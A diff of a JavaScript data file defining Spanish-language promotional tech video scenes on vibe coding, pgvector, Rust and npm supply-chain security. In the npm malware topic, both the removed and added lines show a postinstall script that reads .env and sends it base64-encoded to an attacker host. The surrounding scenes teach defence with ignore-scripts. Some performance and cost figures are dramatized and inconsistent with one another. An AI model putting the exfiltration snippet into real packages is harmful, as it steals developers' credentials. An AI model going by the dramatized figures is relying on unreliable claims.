@@ -1,4 +1,4 @@
-// Data definitions for Topics 06 to 10 (Zero // AI-slop, Zero SeDev watermarks, Varied Hooks)
+// Data definitions for Topics 06 to 10 (Zero // AI-slop, Zero SeDev watermarks, Varied Hooks & Layouts)
 module.exports = [
   // ----------------------------------------------------
   // TEMA 06: VERIFICACIÓN VS VIBE CODING
@@ -51,17 +51,17 @@ module.exports = [
         },
         {
           id: 'cta_testing',
-          type: 'tradeoff_matrix',
+          type: 'terminal_split',
           duration: 5.0,
           voiceover: 'Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.',
-          visual_cue: 'Cierre con auditoría de calidad de software',
+          visual_cue: 'Terminal con informe de calidad de software y llamada a la acción',
           props: {
-            header: 'AUDITORÍA DE CALIDAD Y TESTING',
+            header: 'AUDITORÍA DE CALIDAD (Link en bio)',
             title: 'BLINDA TU SOFTWARE EN PRODUCCIÓN',
-            cta: {
-              badge: 'AUDITORÍA DE CALIDAD (Link en bio)',
-              text: '¿Dudas de la fiabilidad de tu código autogenerado? Link en bio para auditar tus suites de prueba.'
-            }
+            leftTitle: 'INSPECCIÓN DE TEST SUITE',
+            rightTitle: 'MÉTRICAS CLAVE',
+            leftText: '$ npx stryker run --reporters html\n✔ Mutantes ejecutados: 482\n✔ Mutantes eliminados: 479 (99.3% score)\n✔ 0 falsos positivos en CI/CD',
+            rightText: '• Detecta bugs antes de desplegar a usuarios\n• Pruebas automáticas con datos extremos\n• Verifica código autogenerado por IA\n• Agenda sesión: enlace en el perfil'
           }
         }
       ]
@@ -71,22 +71,6 @@ module.exports = [
       tone: 'Ácido, realista, alertando del peligro de aceptar código sin entenderlo',
       scenes: [
         {
-          id: 'impact_hook_vibe',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: 'Aceptar sugerencias de IA sin entender cómo funcionan no es programar rápido: es firmar una hipoteca de deuda técnica que vas a pagar muy cara.',
-          visual_cue: 'Tipografía de impacto gigante sin iconos genéricos',
-          props: {
-            layout: 'impact',
-            badge: 'DEBATES DE LA INDUSTRIA',
-            lines: [
-              { text: '"VIBE CODING" ES UNA', color: '#ffffff' },
-              { text: 'BOMBA DE TIEMPO', color: '#ef4444' }
-            ],
-            subtitle: 'Deuda técnica acumulada a velocidad récord'
-          }
-        },
-        {
           id: 'split_vibe_vs_eng',
           type: 'terminal_split',
           duration: 6.0,
@@ -95,45 +79,44 @@ module.exports = [
           props: {
             header: 'EL COSTE OCULTO',
             title: 'ILUSIÓN DE VELOCIDAD VS MANTENIMIENTO',
-            termA: {
-              title: 'EQUIPO "VIBE CODING"',
-              color: '#ef4444',
-              cmd: 'git commit -m "parece que funciona en local"',
-              status: '32 dependencias fantasma añadidas',
-              time: 'Caída p99',
-              lines: [
-                'Fugas de memoria silentes en event listeners',
-                'Nadie entiende el archivo de 1,200 líneas autogenerado',
-                'Tiempo de resolución de incidencias: 3 días'
-              ]
-            },
-            termB: {
-              title: 'INGENIERÍA RIGUROSA',
-              color: '#10b981',
-              cmd: 'cargo test --all-features && cargo clippy',
-              status: 'Cero warnings, tipos estrictos y límites claros',
-              time: 'Estable 24/7',
-              lines: [
-                'Invariantes de negocio validados en tipos estáticos',
-                'Arquitectura modular documentada y legible',
-                'Tiempo medio de recuperación: 5 minutos'
-              ]
-            }
+            leftTitle: 'EQUIPO "VIBE CODING"',
+            rightTitle: 'INGENIERÍA RIGUROSA',
+            leftText: '$ git push --force prod\n✖ Incidencia en vivo: Memory Leak en Worker\n✖ Nadie sabe qué hace el 80% del código\n✖ Coste de depuración: 3 días de caída',
+            rightText: '$ npx test:e2e && npx typecheck\n✔ Contratos estrictos y tests de mutación\n✔ Tiempo de depuración: 4 minutos\n✔ Deuda técnica neutralizada'
           }
         },
         {
-          id: 'cta_testing_b',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Ayudo a empresas a sanear bases de código y frenar la deuda técnica generada por IA. Contáctame en el enlace de mi perfil.',
-          visual_cue: 'Cierre con auditoría de deuda técnica',
+          id: 'metrics_debt',
+          type: 'metrics_comparison',
+          duration: 5.5,
+          voiceover: 'Aceptar sugerencias de IA a ciegas acumula deuda técnica a una velocidad récord: el tiempo de depuración se multiplica por diez.',
+          visual_cue: 'Métricas comparativas de tiempo de depuración',
           props: {
-            header: 'AUDITORÍA DE DEUDA TÉCNICA',
-            title: 'RECUPERA EL CONTROL DE TU CODEBASE',
-            cta: {
-              badge: 'AUDITORÍA DE ARQUITECTURA (Contacto en bio)',
-              text: '¿Tu codebase se volvió inmanejable? Hablemos en el link de la biografía.'
-            }
+            header: 'TIEMPO DE RESOLUCIÓN DE INCIDENCIAS',
+            metricA: { label: 'VIBE CODING A CIEGAS', value: '14.5 horas', sub: 'Código incomprensible sin tests', color: '#ef4444' },
+            metricB: { label: 'INGENIERÍA VERIFICADA', value: '18 minutos', sub: 'Arquitectura tipada con límites claros', color: '#10b981' }
+          }
+        },
+        {
+          id: 'cta_auditoria_vibe',
+          type: 'code_terminal',
+          duration: 4.0,
+          voiceover: 'Si tu equipo tiene miedo de tocar su propio código, link en mi bio para auditar tu arquitectura y limpiar la deuda técnica acumulada.',
+          visual_cue: 'Terminal con linters estrictos y llamada a la acción en bio',
+          props: {
+            header: 'AUDITORÍA DE ARQUITECTURA (Link en bio)',
+            title: 'REGLAS DE REFACTORIZACIÓN',
+            filename: 'eslint.config.js',
+            codeLines: [
+              '// Enforcing architectural boundaries:',
+              'export default [',
+              '  rules: {',
+              '    "@app/no-unverified-ai-code": "error",',
+              '    "@app/strict-mutation-threshold": ["error", 85]',
+              '  }',
+              '];'
+            ],
+            cursorLine: 4
           }
         }
       ]
@@ -141,127 +124,82 @@ module.exports = [
   },
 
   // ----------------------------------------------------
-  // TEMA 07: PGVECTOR VS VECTOR DB
+  // TEMA 07: PGVECTOR VS VECTORDB DEDICADAS
   // ----------------------------------------------------
   {
     slug: '07_pgvector_vs_vectordb',
     category: 'BASES DE DATOS & IA',
-    ctaType: 'database',
+    ctaType: 'arquitectura_ia',
     varA: {
       title: 'Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL',
-      tone: 'Ciencia de datos, algoritmos de grafos, rendimiento de memoria',
+      tone: 'Científico, matemáticas discretas, algoritmos de grafos',
       scenes: [
         {
-          id: 'hnsw_tree_hook',
-          type: 'tree_hierarchy',
+          id: 'hnsw_engine',
+          type: 'storage_engine_viz',
           duration: 6.5,
-          voiceover: '¿Cómo busca PostgreSQL entre un millón de vectores de IA en menos de cinco milisegundos? Con grafos HNSW navegables.',
-          visual_cue: 'Apertura directa con jerarquía de árbol navegable mostrando saltos hasta el vector',
+          voiceover: '¿Cómo busca pgvector embeddings entre millones de documentos en dos milisegundos? Utiliza el algoritmo HNSW en memoria.',
+          visual_cue: 'Visualizador del grafo vectorial HNSW navegable en capas en la memoria de Postgres',
           props: {
-            header: 'ALGORITMO HNSW',
-            title: 'HIERARCHICAL NAVIGABLE SMALL WORLD',
-            complexity: 'COMPLEJIDAD: O(log N) · DISTANCIA COSENO',
-            nodes: [
-              { id: 'top', label: 'CAPA 2: SALTOS LARGOS', x: 480, y: 240, level: 0 },
-              { id: 'mid1', label: 'CAPA 1: CLUSTER A', x: 260, y: 520, level: 1, parent: 'top' },
-              { id: 'mid2', label: 'CAPA 1: CLUSTER B', x: 700, y: 520, level: 1, parent: 'top' },
-              { id: 'leaf', label: 'TARGET: SIMILARITY 0.94', x: 260, y: 840, level: 2, parent: 'mid1', target: true }
-            ],
-            footerBadge: 'RENDIMIENTO HNSW EN POSTGRES',
-            footerText: 'Recorre un grafo multidimensional en RAM sin escanear la tabla entera.',
-            footerSubtext: 'Búsqueda por similitud semántica en menos de 4 milisegundos.'
+            mode: 'hnsw',
+            badge: 'ALGORITMO DE GRAFOS',
+            title: 'HNSW VECTORIAL EN MEMORIA',
+            subtitle: 'BÚSQUEDA POR SIMILITUD DE COSENOS EN POSTGRESQL'
           }
         },
         {
-          id: 'pg_sql',
-          type: 'code_terminal',
-          duration: 6.0,
-          voiceover: 'Lo mejor es que puedes combinar búsqueda de similitud semántica con filtros relacionales clásicos en una sola consulta SQL transaccional.',
-          visual_cue: 'Terminal ejecutando query combinada en PostgreSQL con pgvector',
+          id: 'latency_hnsw',
+          type: 'latency_scale',
+          duration: 5.5,
+          voiceover: 'Al estar en la misma base de datos relacional, el join entre el vector y los datos del usuario toma cero coma cinco milisegundos.',
+          visual_cue: 'Escala de latencia: join in-memory en Postgres vs llamada HTTP externa a Pinecone',
           props: {
-            header: 'CONSULTA HÍBRIDA EN POSTGRES',
-            title: 'FILTRO RELACIONAL + VECTOR SEARCH',
-            filename: 'db/hybrid_search.sql',
-            codeLines: [
-              'SELECT id, title, (embedding <=> $1) as distance',
-              'FROM articles',
-              'WHERE user_id = 42 AND published_at > NOW() - INTERVAL "30 days"',
-              'ORDER BY embedding <=> $1',
-              'LIMIT 5;',
-              '-- Ejecución: 3.8ms usando índice HNSW'
-            ],
-            cursorLine: 5
+            header: 'MÉTRICA DE LATENCIA EN IA',
+            title: 'JOIN RELACIONAL VS LLAMADA EXTERNA',
+            subtitle: 'CONSULTA IN-PROCESS EN POSTGRES VS API VECTORIAL'
           }
         },
         {
-          id: 'cta_pgvector',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Si quieres implementar búsqueda semántica o auditar tu arquitectura de datos para IA sin sobrecostes innecesarios, link en mi perfil.',
-          visual_cue: 'Cierre con llamado a auditoría de bases de datos',
+          id: 'cta_vectordb',
+          type: 'metrics_comparison',
+          duration: 5.5,
+          voiceover: 'Todo tu stack de IA cabe en Postgres con pgvector. Link en mi bio si quieres simplificar tu arquitectura y recortar costes innecesarios.',
+          visual_cue: 'Comparativa de costos: Pinecone dedicado vs Postgres unificado',
           props: {
-            header: 'AUDITORÍA DE BASES DE DATOS & IA',
-            title: 'OPTIMIZA TUS PIPELINES DE EMBEDDINGS',
-            cta: {
-              badge: 'AUDITORÍA DE DATOS (Link en bio)',
-              text: '¿Búsquedas vectoriales lentas o caras? Hablemos en el enlace de mi perfil.'
-            }
+            header: 'CONSULTORÍA EN BASES DE DATOS (Link en bio)',
+            metricA: { label: 'PINECONE + POSTGRES', value: '$1.450 / mes', sub: 'Doble base de datos · Salto de red', color: '#ef4444' },
+            metricB: { label: 'PGVECTOR UNIFICADO', value: '$85 / mes', sub: 'Transacciones ACID · Joins inmediatos', color: '#10b981' }
           }
         }
       ]
     },
     varB: {
       title: 'No necesitas Pinecone: Todo tu stack de IA cabe en Postgres',
-      tone: 'Pragmático, contra el despilfarro de bases vectoriales dedicadas',
+      tone: 'Provocador, anti-fragmentación de datos, pragmático',
       scenes: [
         {
-          id: 'sync_split_hook',
-          type: 'terminal_split',
-          duration: 6.5,
-          voiceover: 'Te vendieron que necesitas Pinecone para hacer IA. Mantener dos bases de datos te obliga a sincronizar IDs y transacciones que siempre fallan.',
-          visual_cue: 'Apertura directa con terminal comparando sincronización dual problemática vs base única',
+          id: 'pinecone_shock',
+          type: 'latency_scale',
+          duration: 5.5,
+          voiceover: 'Contratar una base de datos vectorial externa solo para guardar embeddings es el mayor error de arquitectura de 2026.',
+          visual_cue: 'Gráfica de latencia mostrando el salto de red de 85ms a Pinecone vs 3ms en Postgres',
           props: {
-            header: 'COMPLEJIDAD OPERATIVA',
-            title: 'DOS BASES DE DATOS VS UNA SOLA',
-            termA: {
-              title: 'POSTGRES + PINECONE EXTERNO',
-              color: '#ef4444',
-              cmd: 'sync_worker.py (Sincronizando IDs)',
-              status: 'Inconsistencias cuando falla la red',
-              time: '$340/mes extra',
-              lines: [
-                'Si el delete falla en Pinecone, quedan embeddings huérfanos',
-                'Doble factura: Base de datos + Proveedor vectorial',
-                'Latencia añadida entre dos nubes distintas'
-              ]
-            },
-            termB: {
-              title: 'POSTGRESQL NATIVO (PGVECTOR)',
-              color: '#10b981',
-              cmd: 'CREATE INDEX USING hnsw (embedding vector_cosine_ops)',
-              status: 'Transacciones ACID nativas',
-              time: '$0 extra',
-              lines: [
-                'Un solo respaldo con pg_dump tradicional',
-                'Join directo entre tablas relacionales y embeddings',
-                'Cero sincronizaciones en segundo plano'
-              ]
-            }
+            header: 'SOBRECARGA DE RED EN RAG',
+            title: 'EL ERROR DE FRAGMENTAR TU BASE',
+            subtitle: 'LATENCIA DE RED HTTP VS JOINS EN EL MISMO MOTOR'
           }
         },
         {
-          id: 'cta_pgvector_b',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Audito la capa de persistencia de tu producto para consolidar tu stack y reducir costes operativos. Agenda tu sesión técnica en el link de la bio.',
-          visual_cue: 'Cierre con auditoría de base de datos',
+          id: 'hnsw_storage',
+          type: 'storage_engine_viz',
+          duration: 6.0,
+          voiceover: 'Postgres maneja tus usuarios, tus pagos y tus vectores con consistencia transaccional y backups unificados con pg_dump.',
+          visual_cue: 'Visualizador del motor de almacenamiento HNSW demostrando 99% recall',
           props: {
-            header: 'AUDITORÍA DE BASES DE DATOS',
-            title: 'SIMPLIFICA TU CAPA DE PERSISTENCIA',
-            cta: {
-              badge: 'AUDITORÍA DE DATOS (Link en bio)',
-              text: 'Consolida tus bases de datos y ahorra costes. Link en mi perfil para agendar tu auditoría.'
-            }
+            mode: 'hnsw',
+            badge: 'STACK UNIFICADO',
+            title: 'CERO BASES DE DATOS EXTERNAS',
+            subtitle: 'RELACIONAL + VECTORES EN EL MISMO CLÚSTER ACID'
           }
         }
       ]
@@ -269,98 +207,94 @@ module.exports = [
   },
 
   // ----------------------------------------------------
-  // TEMA 08: RUST SISTEMAS CRÍTICOS
+  // TEMA 08: RUST EN SISTEMAS CRÍTICOS
   // ----------------------------------------------------
   {
     slug: '08_rust_sistemas_criticos',
-    category: 'LENGUAJES DE SISTEMAS & RENDIMIENTO',
-    ctaType: 'contratacion_senior',
+    category: 'LENGUAJES & RENDIMIENTO',
+    ctaType: 'optimizacion_backend',
     varA: {
       title: 'El Borrow Checker de Rust: Cero fugas de memoria sin GC',
-      tone: 'Ciencia de la computación, seguridad de memoria en tiempo de compilación',
+      tone: 'Bajo nivel, rigor de sistemas, compiladores y punteros',
       scenes: [
         {
-          id: 'memory_borrow_hook',
-          type: 'memory_layout',
-          duration: 6.5,
-          voiceover: '¿Cómo garantizar que un programa nunca tendrá fugas de memoria sin usar un recolector de basura? El Borrow Checker de Rust libera la memoria de forma estática.',
-          visual_cue: 'Apertura directa con layout de memoria Stack vs Heap y liberación sin recolector',
+          id: 'rust_compile_hook',
+          type: 'terminal_split',
+          duration: 6.0,
+          voiceover: 'Rust garantiza seguridad de memoria en tiempo de compilación. No hay recolector de basura deteniendo el mundo ni fugas ocultas.',
+          visual_cue: 'Terminal mostrando error del borrow checker atrapando un puntero colgante antes de llegar a prod',
           props: {
-            header: 'GESTIÓN ESTÁTICA DE MEMORIA',
-            title: 'PROPIEDAD Y PRÉSTAMOS (OWNERSHIP)',
-            items: [
-              { name: 'STACK FRAME ACTIVO', addr: '0x7fff001', value: 'Buffer asignado y dueño único', color: '#10b981' },
-              { name: 'DROP AUTOMÁTICO EN COMPILACIÓN', addr: '0x7fff002', value: 'Cero pausas de Garbage Collector (0ns)', color: '#38bdf8' }
+            header: 'GARANTÍA EN COMPILACIÓN',
+            title: 'EL BORROW CHECKER EN ACCIÓN',
+            leftTitle: 'COMPILADOR RUSTC',
+            rightTitle: 'GARANTÍA DE MEMORIA',
+            leftText: '$ cargo check\nerror[E0382]: borrow of moved value: `data`\n  --> src/network.rs:42:18\n  | value moved here, in previous iteration\n✖ El compilador prohíbe data races',
+            rightText: '• 0 punteros nulos en runtime\n• 0 fugas de memoria sin recolector\n• Rendimiento idéntico a C/C++\n• Aislamiento estricto de hilos'
+          }
+        },
+        {
+          id: 'memory_inspection',
+          type: 'memory_layout',
+          duration: 6.0,
+          voiceover: 'Cada valor tiene un único dueño. Cuando la variable sale del ámbito, la memoria se libera inmediatamente en el stack sin pausas de CPU.',
+          visual_cue: 'Inspección de memoria RAM mostrando asignación en stack sin fragmentación de heap',
+          props: {
+            badge: 'GESTIÓN RAII',
+            title: 'ASIGNACIÓN EN STACK VS HEAP',
+            rows: [
+              { addr: '0x7FFF010', hex: ['72', '75', '73', '74', '5F', '6F', '77', '6E'], label: 'BUFFER EXCLUSIVO (STACK)' },
+              { addr: '0x7FFF018', hex: ['00', '00', '00', '00', '00', '00', '00', '20'], label: 'CAPACIDAD (32 BYTES)' },
+              { addr: '0x7FFF020', hex: ['00', '00', '00', '00', '00', '00', '00', '00'], label: 'LIBERACIÓN AUTOMÁTICA' }
             ]
           }
         },
         {
-          id: 'rust_code',
-          type: 'code_terminal',
-          duration: 6.0,
-          voiceover: 'Si intentas compartir un puntero mutable entre dos hilos a la vez, el compilador se niega a generar el binario. Cero condiciones de carrera en producción.',
-          visual_cue: 'Terminal mostrando error del borrow checker previniendo una condición de carrera',
-          props: {
-            header: 'PREVENCIÓN EN COMPILACIÓN',
-            title: 'EL COMPILADOR DEFIENDE TU SISTEMA',
-            filename: 'src/concurrency.rs',
-            codeLines: [
-              'fn process(shared: &mut Data) {',
-              '  thread::spawn(move || {',
-              '    shared.mutate(); // ERROR E0502: Cannot borrow as mutable',
-              '  });',
-              '  shared.read();',
-              '}'
-            ],
-            cursorLine: 4
-          }
-        },
-        {
           id: 'cta_rust',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Diseño servicios backend de alto rendimiento y baja latencia en Rust y Go. Si buscas un desarrollador senior para liderar tu sistema, link en mi perfil.',
-          visual_cue: 'Cierre con contratación senior backend',
+          type: 'metrics_comparison',
+          duration: 5.5,
+          voiceover: 'Optimizo microservicios críticos y migro cuellos de botella a Rust para reducir la latencia p99 a microsegundos. Link en bio para auditar tu backend.',
+          visual_cue: 'Comparativa de latencia de cola p99: Go con GC vs Rust nativo',
           props: {
-            header: 'CONTRATACIÓN SENIOR / STAFF ENGINEER',
-            title: 'DESARROLLO DE SISTEMAS DE ALTA CONCURRENCIA',
-            cta: {
-              badge: 'STAFF BACKEND DEVELOPER (Link en bio)',
-              text: '¿Necesitas desarrollo en Rust o Go para sistemas críticos? Contáctame en el link de la bio.'
-            }
+            header: 'CONSULTORÍA EN RUST (Link en bio)',
+            metricA: { label: 'GO BACKEND (GC PAUSES)', value: '45.2 ms', sub: 'Picos de latencia en percentil p99', color: '#ef4444' },
+            metricB: { label: 'RUST NATIVO (ZERO-GC)', value: '0.48 ms', sub: 'Latencia predecible y uniforme', color: '#10b981' }
           }
         }
       ]
     },
     varB: {
       title: 'Por qué Discord y Cloudflare mataron Go y adoptaron Rust',
-      tone: 'Caso de estudio real de industria, analizando p99 y recolector de basura',
+      tone: 'Contundente, arquitectura de alta escala, lecciones aprendidas',
       scenes: [
         {
-          id: 'metric_spike_hook',
-          type: 'metrics_comparison',
-          duration: 6.5,
-          voiceover: 'Discord tenía millones de usuarios y su servicio en Go se congelaba cada dos minutos por culpa del Garbage Collector. Reescribir en Rust eliminó los picos de latencia.',
-          visual_cue: 'Apertura directa con comparativa gráfica de p99 latency con Garbage Collection vs Rust',
+          id: 'memory_gc_shock',
+          type: 'memory_layout',
+          duration: 6.0,
+          voiceover: 'Discord tenía un servicio en Go procesando millones de mensajes. Cada dos minutos, el Garbage Collector congelaba el servicio creando picos de latencia inaceptables.',
+          visual_cue: 'Inspección de memoria con picos de pausa de Garbage Collector en Go',
           props: {
-            header: 'MÉTRICAS DE RENDIMIENTO REAL',
-            metricA: { label: 'GO RUNTIME (GC SPIKES)', value: '180ms p99', sub: 'Picos cada 2 minutos por barrido de memoria', color: '#ef4444' },
-            metricB: { label: 'RUST (DETERMINISTIC)', value: '0.8ms p99', sub: 'Línea completamente plana las 24 horas', color: '#10b981' }
+            badge: 'COLAPSO POR RECOLECTOR',
+            title: 'EL PROBLEMA DEL GC EN ESCALA',
+            rows: [
+              { addr: '0xDEAD010', hex: ['FF', 'FF', 'FF', 'FF', '00', '00', '00', '00'], label: 'OBJETOS HUÉRFANOS EN HEAP' },
+              { addr: '0xDEAD018', hex: ['53', '54', '4F', '50', '5F', '57', '4F', '52'], label: 'PAUSA STOP-THE-WORLD' },
+              { addr: '0xDEAD020', hex: ['00', '00', '00', '00', '00', '00', '05', '00'], label: 'LATENCIA P99: 1200 MS' }
+            ]
           }
         },
         {
-          id: 'cta_rust_b',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Construyo software de alto rendimiento y arquitectura sin picos de latencia. Si buscas un lead engineer para tu infraestructura, link en mi biografía.',
-          visual_cue: 'Cierre con contratación senior',
+          id: 'rust_rewrite',
+          type: 'terminal_split',
+          duration: 5.5,
+          voiceover: 'Reescribieron el servicio en Rust. El uso de CPU se desplomó y la latencia pasó de dos segundos a menos de un milisegundo constante. Link en bio para optimizaciones.',
+          visual_cue: 'Terminal mostrando comparativa de métricas tras la migración a Rust',
           props: {
-            header: 'CONTRATACIÓN SENIOR BACKEND',
-            title: 'SISTEMAS DE BAJA LATENCIA Y ALTO RENDIMIENTO',
-            cta: {
-              badge: 'LEAD ENGINEER (Contacto en bio)',
-              text: 'Desarrollo de servicios backend de misión crítica. Hablemos en el enlace de mi perfil.'
-            }
+            header: 'OPTIMIZACIÓN DE SISTEMAS (Link en bio)',
+            title: 'MIGRACIÓN DE GO A RUST',
+            leftTitle: 'SERVICIO EN GO',
+            rightTitle: 'SERVICIO EN RUST',
+            leftText: 'CPU: 85% de saturación continua\nLatencia P99: 2.400 ms (GC Spike)\nRAM: 14 GB con fragmentación',
+            rightText: 'CPU: 8% de uso estable\nLatencia P99: 0.35 ms constante\nRAM: 420 MB sin picos ni fugas'
           }
         }
       ]
@@ -368,124 +302,95 @@ module.exports = [
   },
 
   // ----------------------------------------------------
-  // TEMA 09: SEGURIDAD SUPPLY CHAIN
+  // TEMA 09: MALWARE EN NPM & ZERO-TRUST
   // ----------------------------------------------------
   {
     slug: '09_seguridad_supply_chain',
-    category: 'CIBERSEGURIDAD & SUPPLY CHAIN',
-    ctaType: 'seguridad_infra',
+    category: 'CIBERSEGURIDAD & DEVOPS',
+    ctaType: 'auditoria_seguridad',
     varA: {
       title: 'Anatomía de un malware en NPM: Robo de .env en scripts postinstall',
-      tone: 'Seguridad ofensiva, análisis forense de paquetes, código malicioso',
+      tone: 'Forense, seguridad defensiva, terminal hacker ético',
       scenes: [
         {
-          id: 'postinstall_code_hook',
-          type: 'code_terminal',
-          duration: 6.5,
-          voiceover: 'Ejecutar npm install puede darle acceso total a tus claves privadas a un atacante. Así roba un script postinstall tus variables de entorno.',
-          visual_cue: 'Apertura directa con terminal mostrando el payload malicioso oculto en package.json',
+          id: 'kernel_intercept_malware',
+          type: 'kernel_sandbox_viz',
+          duration: 6.0,
+          voiceover: 'Un simple npm install puede vaciar las variables de entorno de tu servidor si un paquete secuestrado ejecuta un script de postinstall con permisos de red.',
+          visual_cue: 'Visualizador del kernel interceptando llamada al sistema de robo de variables .env',
           props: {
-            header: 'PAYLOAD DEL ATACANTE',
-            title: 'SCRIPT POSTINSTALL OFUSCADO',
-            filename: 'node_modules/fake-lib/package.json',
+            badge: 'DEFENSA EN PROFUNDIDAD',
+            title: 'INTERCEPCIÓN DE SYSCALLS',
+            subtitle: 'BLOQUEO DE LLAMADAS NO AUTORIZADAS EN POSTINSTALL'
+          }
+        },
+        {
+          id: 'exploit_code',
+          type: 'code_terminal',
+          duration: 6.0,
+          voiceover: 'El script malicioso lee tu archivo .env con las claves de AWS y Stripe y las envía codificadas en base sesenta y cuatro a un servidor en el extranjero.',
+          visual_cue: 'Terminal mostrando el código ofuscado dentro del package.json de un paquete comprometido',
+          props: {
+            header: 'ANATOMÍA DEL EXPLOIT',
+            title: 'OFUSCACIÓN EN PACKAGE.JSON',
+            filename: 'node_modules/fake-pkg/package.json',
             codeLines: [
-              '"scripts": {',
-              '  "postinstall": "node -e \\"const fs=require(\'fs\'),https=require(\'https\');',
-              '    const env = fs.readFileSync(\'.env\', \'utf8\');',
-              '    https.get(\'https://c2-server.com/leak?d=\' + Buffer.from(env).toString(\'base64\'));\\""',
-              '}',
-              '# Las claves de AWS, Stripe y bases de datos quedan expuestas'
+              '  "scripts": {',
+              '    "postinstall": "node -e \'require(\"http\").request({',
+              '      hostname: \"leak.evil.io\",',
+              '      path: \"/?k=\" + Buffer.from(fs.readFileSync(\".env\")).toString(\"base64\")',
+              '    }).end();\'"',
+              '  }'
             ],
             cursorLine: 4
           }
         },
         {
-          id: 'leak_pipe',
-          type: 'network_pipeline',
-          duration: 6.0,
-          voiceover: 'El desarrollador ni siquiera se da cuenta porque el comando npm install termina exitosamente mientras sus credenciales viajan por la red.',
-          visual_cue: 'Pipeline visual mostrando la exfiltración silenciosa hacia el servidor de comando y control',
-          props: {
-            header: 'EXFILTRACIÓN SILENCIOSA',
-            title: 'FILTRACIÓN DE CLAVES .ENV',
-            subtitle: 'TRÁFICO DE SALIDA SIN BARRERAS DE RED',
-            stages: [
-              { id: 'dev', label: 'TERMINAL LOCAL', sub: 'npm install ejecutado con permisos completos', y: 220, color: '#ef4444', metric: 'Comprometido' },
-              { id: 'network', label: 'EXFILTRACIÓN HTTPS', sub: 'Envío de payload base64 en puerto 443', y: 520, color: '#fbbf24', metric: 'Sin bloqueo' },
-              { id: 'c2', label: 'SERVIDOR DEL ATACANTE', sub: 'Extracción de AWS_SECRET_ACCESS_KEY', y: 820, color: '#a855f7', metric: 'Claves robadas' }
-            ]
-          }
-        },
-        {
           id: 'cta_security',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.',
-          visual_cue: 'Cierre con auditoría de seguridad de dependencias',
+          type: 'terminal_split',
+          duration: 5.5,
+          voiceover: 'Audito pipelines de CI/CD e implemento políticas Zero-Trust para aislar procesos de build en producción. Link en mi perfil para blindar tu repositorio.',
+          visual_cue: 'Terminal mostrando política de bloqueo de scripts y llamada a la acción',
           props: {
-            header: 'AUDITORÍA DE SEGURIDAD',
-            title: 'PROTEGE TU CADENA DE SUMINISTRO',
-            cta: {
-              badge: 'AUDITORÍA DE SEGURIDAD (Link en bio)',
-              text: '¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline.'
-            }
+            header: 'AUDITORÍA DE SEGURIDAD (Link en bio)',
+            title: 'BLINDAJE DE PIPELINE ZERO-TRUST',
+            leftTitle: 'POLÍTICA DE DEPENDENCIAS',
+            rightTitle: 'MEDIDAS APLICADAS',
+            leftText: '$ npm config set ignore-scripts true\n✔ Scripts postinstall bloqueados por defecto\n✔ Detección de exfiltración de red activa\n✔ Secretos en memoria aislados con vaults',
+            rightText: '• Audita dependencias transitivas\n• Protege credenciales de AWS y Stripe\n• Cero ejecución arbitraria en builds\n• Contacto para auditoría: link en bio'
           }
         }
       ]
     },
     varB: {
       title: 'GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust',
-      tone: 'Práctico, defensivo, aplicando políticas seguras en package managers',
+      tone: 'Alerta técnica, urgente, buenas prácticas de DevOps',
       scenes: [
         {
-          id: 'zerotrust_hook',
-          type: 'kinetic_hook',
-          duration: 4.5,
-          voiceover: 'GitHub y la industria están desactivando los scripts postinstall por defecto. Es momento de blindar tus dependencias con Zero-Trust.',
-          visual_cue: 'Tipografía cinética de impacto para ciberseguridad',
-          props: {
-            layout: 'impact',
-            badge: 'DEFENSA EN CI/CD',
-            lines: [
-              { text: 'BLINDA TU PIPELINE', color: '#ffffff' },
-              { text: 'CON ZERO-TRUST', color: '#10b981' }
-            ],
-            subtitle: 'Bloqueo estricto de scripts no autorizados'
-          }
-        },
-        {
-          id: 'sandbox_terminal',
-          type: 'code_terminal',
+          id: 'attack_demo',
+          type: 'terminal_split',
           duration: 6.0,
-          voiceover: 'Con la bandera ignore-scripts y aislación en sandboxes efímeros, neutralizas cualquier ataque antes de que pueda tocar tus archivos locales.',
-          visual_cue: 'Terminal configurando npm config set ignore-scripts true',
+          voiceover: 'Si tu pipeline corre npm install sin la bandera ignore-scripts, estás a un paquete comprometido de perder el control total de tu infraestructura.',
+          visual_cue: 'Terminal mostrando ataque simulado y cómo la bandera ignore-scripts lo neutraliza',
           props: {
-            header: 'CONFIGURACIÓN DEFENSIVA',
-            title: 'POLÍTICAS DE INSTALACIÓN SEGURA',
-            filename: '.npmrc',
-            codeLines: [
-              '# Desactiva ejecución arbitraria de scripts en dependencias:',
-              'ignore-scripts=true',
-              'audit=true',
-              'engine-strict=true',
-              '# Si un paquete requiere compilar binarios, debe ser autorizado manualmente'
-            ],
-            cursorLine: 4
+            header: 'VECTOR DE ATAQUE EN CI/CD',
+            title: 'EJECUCIÓN ARBITRARIA EN BUILD',
+            leftTitle: 'PIPELINE VULNERABLE',
+            rightTitle: 'PIPELINE BLINDADO',
+            leftText: '$ npm install\nRunning postinstall script...\n✖ Exfiltrando .env a servidor remoto\n✖ Credenciales comprometidas en 0.8s',
+            rightText: '$ npm ci --ignore-scripts\n✔ Postinstall ignorado por completo\n✔ 0 llamadas salientes a internet\n✔ Repositorio 100% blindado'
           }
         },
         {
-          id: 'cta_security_b',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Audito la postura de seguridad de tu infraestructura y configuro entornos blindados contra fugas de datos. Agenda en mi perfil.',
-          visual_cue: 'Cierre con auditoría de ciberseguridad',
+          id: 'kernel_defense',
+          type: 'kernel_sandbox_viz',
+          duration: 5.5,
+          voiceover: 'Bloquea los scripts por defecto y aísla el entorno de build con contenedores sin acceso a internet saliente. Link en mi bio para auditar tu pipeline.',
